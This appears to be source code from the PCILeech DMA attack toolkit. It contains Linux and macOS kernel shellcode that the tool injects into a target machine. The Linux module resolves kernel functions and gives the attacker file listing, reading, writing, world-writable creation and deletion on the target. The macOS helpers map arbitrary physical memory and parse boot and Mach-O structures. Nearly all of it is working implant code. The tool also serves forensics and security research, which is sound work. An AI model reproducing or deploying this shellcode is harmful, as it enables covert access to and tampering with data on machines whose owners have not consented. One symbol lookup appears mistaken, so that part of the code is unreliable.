// kstat struct - kernels 4.10 and earlier.
struct kstat_4_10 {
	QWORD	ino;
	DWORD	dev;
	DWORD	mode;
	DWORD	nlink;
	DWORD	uid;
	DWORD	gid;
	DWORD	rdev;
	QWORD	size;	// offset 0x20
	struct timespec atime;
	struct timespec mtime;
	struct timespec ctime;
	QWORD	blksize;
	QWORD	blocks;
	QWORD	_pcileech_dummy_extra[2];
};

// kstat struct - kernels 4.11 and later.
struct kstat_4_11 {
	DWORD	result_mask;
	DWORD	mode;
	DWORD	nlink;
	DWORD	blksize;
	QWORD	attributes;
	QWORD	attributes_mask;
	QWORD	ino;
	DWORD	dev;
	DWORD	rdev;
	DWORD	uid;
	DWORD	gid;
	QWORD	size;
	struct timespec atime;
	struct timespec mtime;
	struct timespec ctime;
	struct timespec btime;
	QWORD	blocks;
	QWORD	_pcileech_dummy_extra[2];
};

//-----------------------------------------------------------------------------
// Functions below.
//-----------------------------------------------------------------------------

typedef struct tdFN2 {
	QWORD memcpy;
	QWORD memset;
	QWORD filp_close;
	QWORD filp_open;
	QWORD vfs_read;
	QWORD vfs_write;
	QWORD yield;
	QWORD printk;
	QWORD iterate_dir_opt;
	QWORD vfs_readdir_opt;
	QWORD vfs_stat_opt;
	QWORD vfs_statx_opt;
    struct {
        QWORD sys_unlink;
        QWORD getname;
        QWORD do_unlinkat;
    } rm;
	QWORD kern_path_opt;
	QWORD path_put_opt;
	QWORD vfs_getattr_nosec_opt;
	QWORD kernel_read;
	QWORD kernel_write;
} FN2, *PFN2;

typedef struct tdDIR_CONTEXT {
	QWORD actor;
	QWORD pos;
} DIR_CONTEXT;

typedef struct tdDIR_CONTEXT_EXTENDED {
	DIR_CONTEXT ctx;
	PKMDDATA pk;
	PFN2 fn;
	PVFS_OPERATION pop;
	QWORD buf[];
} DIR_CONTEXT_EXTENDED, *PDIR_CONTEXT_EXTENDED;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD i = 0, NAMES[sizeof(FN2) / sizeof(QWORD)];
	NAMES[i++] = (QWORD)(CHAR[]) { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'm', 'e', 'm', 's', 'e', 't', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'f', 'i', 'l', 'p', '_', 'c', 'l', 'o', 's', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'f', 'i', 'l', 'p', '_', 'o', 'p', 'e', 'n', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'f', 's', '_', 'r', 'e', 'a', 'd', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'f', 's', '_', 'w', 'r', 'i', 't', 'e', 0 };	
	NAMES[i++] = (QWORD)(CHAR[]) { 'y', 'i', 'e', 'l', 'd', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'p', 'r', 'i', 'n', 't', 'k', 0 };
	if(!LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, i)) { return FALSE; }
	// optional lookup 1#: (due to kernel version differences)
	pfn2->iterate_dir_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'i', 't', 'e', 'r', 'a', 't', 'e', '_', 'd', 'i', 'r', 0 }));
	pfn2->vfs_readdir_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'v', 'f', 's', '_', 'r', 'e', 'a', 'd', 'd', 'i', 'r', 0 }));
	if(!pfn2->iterate_dir_opt && !pfn2->vfs_readdir_opt) { return FALSE; }
	// optional lookup 2#:
	pfn2->vfs_stat_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'v', 'f', 's', '_', 's', 't', 'a', 't', 0 }));
	pfn2->vfs_statx_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'v', 'f', 's', '_', 's', 't', 'a', 't', 'x', 0 }));
	if(!pfn2->vfs_stat_opt && !pfn2->vfs_statx_opt) { return FALSE; }
	pfn2->kern_path_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'k', 'e', 'r', 'n', '_', 'p', 'a', 't', 'h', 0 }));
	pfn2->path_put_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'p', 'a', 't', 'h', '_', 'p', 'u', 't', 0 }));
	pfn2->vfs_getattr_nosec_opt = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'v', 'f', 's', '_', 'g', 'e', 't', 'a', 't', 't', 'r', '_', 'n', 'o', 's', 'e', 'c', 0 }));
    // optional lookup #3
    pfn2->rm.sys_unlink = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'v', 'f', 's', '_', 's', 't', 'a', 't', 0 }));
    pfn2->rm.getname = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'g', 'e', 't', 'n', 'a', 'm', 'e', 0 }));
    pfn2->rm.do_unlinkat = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'd', 'o', '_', 'u', 'n', 'l', 'i', 'n', 'k', 'a', 't', 0 }));
	if(!pfn2->rm.sys_unlink && !(pfn2->rm.getname && pfn2->rm.do_unlinkat)) { return FALSE; }
	// optional kernel vfs read/write #4:
	pfn2->kernel_read = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'k', 'e', 'r', 'n', 'e', 'l', '_', 'r', 'e', 'a', 'd', 0 }));
	pfn2->kernel_write = LOOKUP_FUNCTION(pk, ((CHAR[]) { 'k', 'e', 'r', 'n', 'e', 'l', '_', 'w', 'r', 'i', 't', 'e', 0 }));
	return TRUE;
}

static int VfsList_CallbackIterateDir(PDIR_CONTEXT_EXTENDED ctx, const char *name, int len, unsigned __int64 pos, unsigned __int64 ino, unsigned int d_type)
{
	UNREFERENCED_PARAMETER(ino);
	UNREFERENCED_PARAMETER(pos);
	QWORD i;
	PVFS_RESULT_FILEINFO pfi;
	if(ctx->pk->dataOutExtraLength + sizeof(VFS_RESULT_FILEINFO) > ctx->pk->dataOutExtraLengthMax) {
		return 0;
	}
	pfi = (PVFS_RESULT_FILEINFO)(ctx->pk->DMAAddrVirtual + ctx->pk->dataOutExtraOffset + ctx->pk->dataOutExtraLength);
	SysVCall(ctx->fn->memset, pfi, 0, sizeof(VFS_RESULT_FILEINFO));
	switch(d_type) {
		case DT_REG:
			pfi->flags = VFS_FLAGS_FILE_NORMAL;
			break;
		case DT_DIR:
			pfi->flags = VFS_FLAGS_FILE_DIRECTORY;
			break;
		case DT_LNK:
			pfi->flags = VFS_FLAGS_FILE_SYMLINK;
			break;
		default:
			pfi->flags = VFS_FLAGS_FILE_OTHER;
			break;
	}
	for(i = 0; i < len && i < MAX_PATH - 1; i++) {
		pfi->wszFileName[i] = name[i];
	}
	ctx->pk->dataOutExtraLength += sizeof(VFS_RESULT_FILEINFO);
	return 0;
}

QWORD UnixToWindowsFiletime(QWORD tv) {
	QWORD result = 11644473600ULL; // EPOCH DIFF
	result += tv;
	result *= 10000000ULL;
	return result;
}

VOID VfsList_SetSizeTime(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	QWORD i, o, p, cfi, result;
	BYTE path[0x800];
	CHAR sz[2 * MAX_PATH];
	struct kstat_4_10 kstat_4_10;
	struct kstat_4_11 kstat_4_11;
	PVFS_RESULT_FILEINFO pfi;
	cfi = pk->dataOutExtraLength / sizeof(VFS_RESULT_FILEINFO);
	for(o = 0; o < MAX_PATH; o++) {
		if(0 == pop->szFileName[o]) { break; }
		sz[o] = pop->szFileName[o];
	}
	sz[o] = '/';
	o++;
	pk->dataOut[2] = cfi;
	for(p = 0; p < cfi; p++) {
		pfi = (PVFS_RESULT_FILEINFO)(pk->DMAAddrVirtual + pk->dataOutExtraOffset + p * sizeof(VFS_RESULT_FILEINFO));
		// set filename
		for(i = 0; i < MAX_PATH; i++) {
			if(0 == pfi->wszFileName[i]) { break; }
			sz[o + i] = (CHAR)pfi->wszFileName[i];
		}
		sz[o + i] = 0;
		if(pfn2->vfs_statx_opt) { // 4.11 kernels and later.
			result = SysVCall(pfn2->vfs_statx_opt, AT_FDCWD, sz, AT_NO_AUTOMOUNT, &kstat_4_11, STATX_BASIC_STATS);
			if(result && pfn2->kern_path_opt && pfn2->vfs_getattr_nosec_opt) {
				// 5.12 kernels and later will fail vfs_statx - use alternative method:
				result = SysVCall(pfn2->kern_path_opt, sz, AT_NO_AUTOMOUNT, path);
				if(0 == result) {
					result = SysVCall(pfn2->vfs_getattr_nosec_opt, path, &kstat_4_11, STATX_BASIC_STATS, 0);
					if(pfn2->path_put_opt) { SysVCall(pfn2->path_put_opt, path); }
				}
			}
			if(0 == result) {
				pfi->cb = kstat_4_11.size;
				pfi->tAccessOpt = UnixToWindowsFiletime(kstat_4_11.atime.tv_sec);
				pfi->tCreateOpt = UnixToWindowsFiletime(kstat_4_11.ctime.tv_sec);
				pfi->tModifyOpt = UnixToWindowsFiletime(kstat_4_11.mtime.tv_sec);
			}
		} else { // 4.10 kernels and earlier.
			result = SysVCall(pfn2->vfs_stat_opt, sz, &kstat_4_10);
			if(0 == result) {
				pfi->cb = kstat_4_10.size;
				pfi->tAccessOpt = UnixToWindowsFiletime(kstat_4_10.atime.tv_sec);
				pfi->tCreateOpt = UnixToWindowsFiletime(kstat_4_10.ctime.tv_sec);
				pfi->tModifyOpt = UnixToWindowsFiletime(kstat_4_10.mtime.tv_sec);
			}
		}
		if(0 == (p % 50)) { SysVCall(pfn2->yield); } // yield at intervals to avoid problems...
	}
}

STATUS VfsList(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	DIR_CONTEXT_EXTENDED dce;
	QWORD hFile;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, O_RDONLY | O_DIRECTORY | O_NOATIME, 0);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	WinCallSetFunction((QWORD)VfsList_CallbackIterateDir);
	dce.ctx.actor = (QWORD)WinCall;
	dce.fn = pfn2;
	dce.pk = pk;
	dce.pop = pop;
	if(pfn2->iterate_dir_opt) {
		// use iterate_dir (kernel >= 3.11) 
		pk->dataOut[1] = SysVCall(pfn2->iterate_dir_opt, hFile, &dce);
	} else if(pfn2->vfs_readdir_opt) {
		// use vfs_readdir (kernel <= 3.10)
		pk->dataOut[1] = SysVCall(pfn2->vfs_readdir_opt, hFile, WinCall, &dce);
	}
	SysVCall(pfn2->filp_close, hFile, NULL);
	SysVCall(pfn2->yield);
	VfsList_SetSizeTime(pk, pfn2, pop);
	return STATUS_SUCCESS;
}

STATUS VfsDelete(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	QWORD result;
    result = pfn2->rm.sys_unlink ?
        SysVCall(pfn2->rm.sys_unlink, pop->szFileName) :
        SysVCall(pfn2->rm.do_unlinkat, AT_FDCWD, SysVCall(pfn2->rm.getname, pop->szFileName));
	return result ? STATUS_FAIL_ACTION : STATUS_SUCCESS;
}

STATUS VfsRead(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	QWORD hFile;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, O_RDONLY | O_NOATIME, 0);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	pk->dataOutExtraLength = SysVCall((pfn2->kernel_read ? pfn2->kernel_read : pfn2->vfs_read), hFile, pk->DMAAddrVirtual + pk->dataOutExtraOffset, pk->dataOutExtraLengthMax, &pop->offset);
	SysVCall(pfn2->filp_close, hFile, NULL);
	return (pk->dataOutExtraLength <= pk->dataOutExtraLengthMax) ? STATUS_SUCCESS : STATUS_FAIL_ACTION;
}

STATUS VfsWrite(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	QWORD hFile, flags = 0, result;
	flags |= O_WRONLY | O_NOATIME;
	flags |= (pop->flags & VFS_FLAGS_TRUNCATE_ON_WRITE) ? O_TRUNC : 0;
	flags |= (pop->flags & VFS_FLAGS_APPEND_ON_WRITE) ? O_APPEND : 0;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, flags, 0);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	result = SysVCall((pfn2->kernel_write ? pfn2->kernel_write : pfn2->vfs_write), hFile, pop->pb, pop->cb, &pop->offset);
	SysVCall(pfn2->filp_close, hFile, NULL);
	return result ? STATUS_FAIL_ACTION : STATUS_SUCCESS;
}

STATUS VfsCreate(PKMDDATA pk, PFN2 pfn2, PVFS_OPERATION pop)
{
	UNREFERENCED_PARAMETER(pk);
	QWORD hFile;
	hFile = SysVCall(pfn2->filp_open, pop->szFileName, O_CREAT | O_WRONLY | O_TRUNC, 0x1ff /*-rwxrwxrwx*/);
	if(hFile > 0xffffffff00000000) {
		return STATUS_FAIL_FILE_CANNOT_OPEN;
	}
	SysVCall(pfn2->filp_close, hFile, NULL);
	return STATUS_SUCCESS;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	PVFS_OPERATION pop;
	FN2 fn2;
	// initialize kernel functions
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	// setup references to in/out data and check validity
	pop = (PVFS_OPERATION)(pk->DMAAddrVirtual + pk->dataInExtraOffset);
	if((pk->dataInExtraLength < sizeof(VFS_OPERATION)) || (pop->magic != VFS_OP_MAGIC) || (pop->flags & VFS_FLAGS_UNICODE)) {
		pk->dataOut[0] = STATUS_FAIL_SIGNATURE_NOT_FOUND;
		return;
	}
	// take action
	if(pop->op == VFS_OP_CMD_LIST_DIRECTORY) {
		pk->dataOut[0] = VfsList(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_READ) {
		pk->dataOut[0] = VfsRead(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_WRITE) {
		pk->dataOut[0] = VfsWrite(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_CREATE) {
		pk->dataOut[0] = VfsCreate(pk, &fn2, pop);
		return;
	}
	if(pop->op == VFS_OP_CMD_DELETE) {
		pk->dataOut[0] = VfsDelete(pk, &fn2, pop);
		return;
	}
}

```

`pcileech_shellcode/macos_common.c`:

```c
// macos_common.c : support functions used by macOS KMDs started by stage3 EXEC.
// Compatible with macOS.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//

#include "macos_common.h"

//-------------------------------------------------------------------------------
// EFI related defines below.
//-------------------------------------------------------------------------------

typedef struct PE_state {
	QWORD initialized;
	QWORD video_dummy[18];
	PVOID deviceTreeHead;
	PVOID bootArgs;
} PE_state_t, *PPE_state_t;

enum {
	EfiReservedMemoryType = 0,
	EfiLoaderCode = 1,
	EfiLoaderData = 2,
	EfiBootServicesCode = 3,
	EfiBootServicesData = 4,
	EfiRuntimeServicesCode = 5,
	EfiRuntimeServicesData = 6,
	EfiConventionalMemory = 7,
	EfiUnusableMemory = 8,
	EfiACPIReclaimMemory = 9,
	EfiACPIMemoryNVS = 10,
	EfiMemoryMappedIO = 11,
	EfiMemoryMappedIOPortSpace = 12,
	EfiPalCode = 13,
	EfiMaxMemoryType = 14
};

typedef struct tdEFI_MEMORY_RANGE {
	DWORD Type;
	DWORD Pad;
	QWORD PhysicalStart;
	QWORD VirtualStart;
	QWORD NumberOfPages;
	QWORD Attribute;
} EFI_MEMORY_RANGE, *PEFI_MEMORY_RANGE;

#define BOOT_LINE_LENGTH        1024

typedef struct tdBOOT_ARGS {
	QWORD RevisionAndVersion;
	CHAR  CommandLine[BOOT_LINE_LENGTH]; // Passed in command line 
	DWORD MemoryMap; // Physical address of memory map 
	DWORD MemoryMapSize;
	DWORD MemoryMapDescriptorSize;
	DWORD MemoryMapDescriptorVersion;
	// truncated struct members exists
} BOOT_ARGS, *PBOOT_ARGS;

//-------------------------------------------------------------------------------
// Kernel module functions below.
//-------------------------------------------------------------------------------

BOOL GetMemoryMap(PKMDDATA pk, PBYTE pbBuffer4k_PhysicalMemoryRange, PQWORD pcbBuffer4k_PhysicalMemoryRange)
{
	PBOOT_ARGS ba = ((PPE_state_t)pk->fn._PE_state)->bootArgs;
	PEFI_MEMORY_RANGE pEFIr;
	PPHYSICAL_MEMORY_RANGE pmr;
	QWORD cPmr = 0, o = 0;
	SysVCall(pk->fn.memset, pbBuffer4k_PhysicalMemoryRange, 0ULL, 4096ULL);
	pmr = (PPHYSICAL_MEMORY_RANGE)pbBuffer4k_PhysicalMemoryRange;
	while(o < ba->MemoryMapSize) {
		pEFIr = (PEFI_MEMORY_RANGE)(VM_MIN_KERNEL_ADDRESS + ba->MemoryMap + o);
		if(pEFIr->Type < EfiMaxMemoryType && pEFIr->Type != EfiReservedMemoryType && pEFIr->Type != EfiUnusableMemory && pEFIr->Type != EfiMemoryMappedIO && pEFIr->Type != EfiMemoryMappedIOPortSpace) {
			if(cPmr && (pEFIr->PhysicalStart == pmr[cPmr - 1].BaseAddress + pmr[cPmr - 1].NumberOfBytes)) {
				pmr[cPmr - 1].NumberOfBytes += pEFIr->NumberOfPages * 0x1000;
			} else {
				pmr[cPmr].BaseAddress = pEFIr->PhysicalStart;
				pmr[cPmr].NumberOfBytes = pEFIr->NumberOfPages * 0x1000;
				cPmr++;
			}
		}
		o += ba->MemoryMapDescriptorSize;
	}
	*pcbBuffer4k_PhysicalMemoryRange = cPmr * sizeof(PHYSICAL_MEMORY_RANGE);
	return TRUE;
}

QWORD MapMemoryPhysical(PKMDDATA pk, QWORD qwMemoryBase)
{
	for(DWORD i = 0; i < 512 * 8; i++) { // PT*8 -> Pages (16MB)
		((PQWORD)(pk->ReservedKMD[0] + 0x2000))[i] = 0x0000000000000003 | (qwMemoryBase + 0x1000 * i);
	}
	PageFlush();
	return 0xffffee8000000000;
}

BOOL IsRangeInPhysicalMap(PBYTE pbMemoryRanges, QWORD cbMemoryRanges, QWORD qwBaseAddress, QWORD qwNumberOfBytes)
{
	PPHYSICAL_MEMORY_RANGE ppmr;
	for(QWORD i = 0; i < cbMemoryRanges / sizeof(PHYSICAL_MEMORY_RANGE); i++) {
		ppmr = ((PPHYSICAL_MEMORY_RANGE)pbMemoryRanges) + i;
		if(((ppmr->BaseAddress <= qwBaseAddress) && (ppmr->BaseAddress + ppmr->NumberOfBytes > qwBaseAddress + qwNumberOfBytes))) {
			return TRUE;
		}
	}
	return FALSE;
}

QWORD GetMemoryPhysicalMaxAddress(PBYTE pbMemoryRanges, QWORD cbMemoryRanges)
{
	PPHYSICAL_MEMORY_RANGE pMemMap = (PPHYSICAL_MEMORY_RANGE)pbMemoryRanges;
	QWORD cMemMap = cbMemoryRanges / sizeof(PHYSICAL_MEMORY_RANGE);
	return pMemMap[cMemMap - 1].BaseAddress + pMemMap[cMemMap - 1].NumberOfBytes;
}


BOOL _WriteLargeOutput_WaitForAck(PKMDDATA pk)
{
	PEXEC_IO pis = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_IS);
	PEXEC_IO pos = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_OS);
	while((pk->_op == KMD_CMD_EXEC_EXTENDED) && ((pis->magic != EXEC_IO_MAGIC) || (!pis->bin.fCompletedAck && (pis->bin.seqAck != pos->bin.seq)))) {
		SysVCall(pk->fn.IOSleep, 25);
	}
	return (pk->_op == KMD_CMD_EXEC_EXTENDED) && !pis->bin.fCompletedAck;
}

BOOL WriteLargeOutput_WaitNext(PKMDDATA pk)
{
	PEXEC_IO pos = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_OS);
	pos->magic = EXEC_IO_MAGIC;
	CacheFlush();
	pos->bin.seq++;
	pk->_op = KMD_CMD_EXEC_EXTENDED;
	return _WriteLargeOutput_WaitForAck(pk);
}

VOID WriteLargeOutput_Finish(PKMDDATA pk)
{
	PEXEC_IO pos = (PEXEC_IO)(pk->DMAAddrVirtual + EXEC_IO_DMAOFFSET_OS);
	WriteLargeOutput_WaitNext(pk);
	pk->dataOutExtraLength = 0;
	CacheFlush();
	pos->bin.fCompleted = TRUE;
	pos->bin.seq++;
	_WriteLargeOutput_WaitForAck(pk);
	pk->_op = KMD_CMD_EXEC;
}

```

`pcileech_shellcode/macos_common.h`:

```h
// macos_common.h : definitions of commonly used shellcode functions
// Compatible with macOS.
//
// Author: Ulf Frisk, pcileech@frizk.net
//

#ifndef __MACOS_COMMON_H__
#define __MACOS_COMMON_H__

#include "statuscodes.h"

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR;
typedef unsigned short			WCHAR, *PWCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD;
typedef unsigned __int64		QWORD, *PQWORD;
typedef void					*HANDLE;
#define NULL					((void *)0)
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0
#define UNREFERENCED_PARAMETER(P) (P)

typedef unsigned long			STATUS;

extern QWORD SysVCall(QWORD fn, ...);
extern QWORD LookupFunctionMacOS(QWORD qwAddrKernelBase, CHAR szFunctionName[]);
extern VOID PageFlush();
extern QWORD GetCR3();
extern VOID CacheFlush();

//-------------------------------------------------------------------------------
// General definitions below.
//-------------------------------------------------------------------------------

#define VM_MIN_KERNEL_ADDRESS				0xFFFFFF8000000000UL
#define VM_MIN_PHYSICALMAPPING_ADDRESS		0xFFFFEE8000000000UL

typedef struct tdPHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef struct tdFNMACOS { // function pointers to macOS functions (used in main control program)
	QWORD _kernel_map;
	QWORD _PE_state;
	QWORD IOFree;
	QWORD IOFreeContiguous;
	QWORD IOMalloc;
	QWORD IOMallocContiguous;
	QWORD IOSleep;
	QWORD memcmp;
	QWORD memcpy;
	QWORD memset;
	QWORD vm_protect;
	QWORD ReservedFutureUse[21];
} FNMACOS, *PFNMACOS;

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	FNMACOS fn;						// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

#define EXEC_IO_MAGIC					0x12651232dfef9521
#define EXEC_IO_CONSOLE_BUFFER_SIZE		0x800
#define EXEC_IO_DMAOFFSET_IS			0x80000
#define EXEC_IO_DMAOFFSET_OS			0x81000
typedef struct tdEXEC_IO {
	QWORD magic;
	struct {
		QWORD cbRead;
		QWORD cbReadAck;
		QWORD Reserved[10];
		BYTE  pb[800];
	} con;
	struct {
		QWORD seq;
		QWORD seqAck;
		QWORD fCompleted;
		QWORD fCompletedAck;
	} bin;
	QWORD Reserved[395];
} EXEC_IO, *PEXEC_IO;

//-------------------------------------------------------------------------------
// Function definitions below.
//-------------------------------------------------------------------------------

/*
* Checks whether the qwBaseAddress+qwNumberOfBytes range is completely inside a
* valid range inside the memory map.
* -- pbMemoryRanges = address of the memory map.
* -- cbMemoryRanges = byte count of the memory map.
* -- qwBaseAddress = base address if range to verify.
* -- qwNumberOfBytes = byte count of the range to verify.
* -- return = TRUE (range in map) / FALSE (range not in map)
*
*/
BOOL IsRangeInPhysicalMap(PBYTE pbMemoryRanges, QWORD cbMemoryRanges, QWORD qwBaseAddress, QWORD qwNumberOfBytes);

/*
* Retrieve the EFI map and place the usable chunks in the supplied buffer.
* The chunks are in the format of PHYSICAL_MEMORY_RANGE.
* -- pk
* -- pbBuffer4k_PhysicalMemoryRange = buffer to place result in.
* -- pcbBuffer4k_PhysicalMemoryRange = bytes written to buffer.
* -- return = TRUE/FALSE
*/
BOOL GetMemoryMap(PKMDDATA pk, PBYTE pbBuffer4k_PhysicalMemoryRange, PQWORD pcbBuffer4k_PhysicalMemoryRange);

/*
* Map a maximum of 16MB physical memory starting at qwMemoryBase. The physical
* memory is mapped onto the virtual address 0xFFFFEE8000000000.
* -- pk
* -- qwMemoryBase = physical page aligned base address to map to virtual space.
* -- return = 0xFFFFEE8000000000 (mapped virtual address)
*/
QWORD MapMemoryPhysical(PKMDDATA pk, QWORD qwMemoryBase);

/*
* Retrive the maximum physical memory address in the system.
* -- pbMemoryRanges = address of the memory map.
* -- cbMemoryRanges = byte count of the memory map.
* -- return = the maximum memory address.
*/
QWORD GetMemoryPhysicalMaxAddress(PBYTE pbMemoryRanges, QWORD cbMemoryRanges);

/*
* If a large output is to be written to PCILeech which won't fit in the DMA
* buffer - write as much as possible in the DMA buffer and then call this fn.
* When returned successfully write another chunk to this buffer and call again.
* WriteLargeOutput_Finish must be called after all data is written to clean up.
* -- pk
* -- return
*/
BOOL WriteLargeOutput_WaitNext(PKMDDATA pk);

/*
* Clean up function that must be called if WriteLargeOutput_WaitNext has
* previously been called.
* -- pk
*/
VOID WriteLargeOutput_Finish(PKMDDATA pk);

#endif /* __MACOS_COMMON_H__ */
```

`pcileech_shellcode/macos_common_a.asm`:

```asm
; macos_common_a.asm : assembly to receive execution from stage3 exec command.
; Compatible with macOS.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

; -------------------------------------
; Prototypes
; -------------------------------------
main PROTO
LookupFunctionMacOS PROTO
SysVCall PROTO
PageFlush PROTO
GetCR3 PROTO
EXTRN c_EntryPoint:NEAR

; -------------------------------------
; Code
; -------------------------------------
.CODE

main PROC
	PUSH rsi
	MOV rsi, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL c_EntryPoint
	MOV rsp, rsi
	POP rsi
	RET
main ENDP

; ----------------------------------------------------
; TRIVIAL VERSION OF STRCMP
; destroyed registers :: <none>
; rdi -> ptr to str1
; rsi -> ptr to str2
; rax <- 0 == success, !0 == fail
; ----------------------------------------------------
strcmp_simple PROC
	PUSH rcx
	XOR rcx, rcx
	DEC rcx
	loop_strcmp:
	INC rcx
	MOV al, [rdi+rcx]
	CMP al, [rsi+rcx]
	JNE error
	CMP al, 0
	JNE loop_strcmp
	XOR rax, rax
	POP rcx
	RET
	error:
	MOV al, 1
	POP rcx
	RET
strcmp_simple ENDP

; ----------------------------------------------------
; LOCATE THE __LINKEDIT END ADDRESS BY SEARCHING THE MACH-O HEADER.
; destroyed registers :: rcx
; rdi -> macho_header address
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_linkedit_end_addr PROC
	MOV eax, 0FEEDFACFh			; mach_header_64 magic
	CMP eax, [rdi]
	JNE error
	MOV eax, 01000007h			; mach_header_64 cputype
	CMP eax, [rdi+4]
	JNE error

	XOR rcx, rcx
	MOV rax, 044454B4E494C5F5Fh		; __LINKED
	loop_search_linkedit:
	CMP rax, [rdi+rcx]
	JE success_search_linkedit
	ADD rcx, 4
	CMP rcx, 2000h
	JE error
	JMP loop_search_linkedit

	success_search_linkedit:
	MOV rax, [rdi+rcx+10h]
	ADD rax, [rdi+rcx+18h]
	RET

	error:
	XOR rax, rax
	RET
macho_parse_find_linkedit_end_addr ENDP

; ----------------------------------------------------
; parse mach-o header to find symtab location.
; NB! no sanity checks performed !!!
; destroyed registers :: rcx
; rdi -> macho_header address
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_symtab PROC
	MOV rcx, rdi
	ADD rcx, 20h
	
	loop_search_symtab:
	MOV eax, 2
	CMP [rcx], eax
	JE success_search_symtab
	MOV eax, [rcx+4]
	ADD rcx, rax
	JMP loop_search_symtab
	
	success_search_symtab:
	MOV rax, rcx
	RET
macho_parse_find_symtab ENDP

; ----------------------------------------------------
